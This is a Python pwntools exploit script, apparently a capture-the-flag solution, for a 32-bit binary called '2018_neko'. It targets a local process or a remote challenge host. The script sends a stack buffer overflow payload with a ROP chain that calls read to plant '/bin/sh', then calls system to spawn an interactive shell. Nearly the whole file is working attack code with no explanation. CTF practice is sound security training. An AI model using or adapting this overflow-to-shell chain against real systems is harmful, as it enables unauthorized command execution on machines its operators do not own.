#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./2018_neko'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',29376)
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		
		io.recv()
		io.sendline('Y')
		io.recv()
		pay='a'*0xd4+p32(elf.plt['read'])+p32(0x080486E7)+p32(0)+p32(0x0804a03c)+p32(8)
		io.sendline(pay)
		io.send('/bin/sh\x00')
		pay='a'*0xd4+p32(elf.plt['system'])+p32(0x080486E7)+p32(0x0804a03c)
		io.sendline(pay)
		
		
		
		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# system_addr=libc.sym['system']

		# success('heap_base:'+hex(heap_base))
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue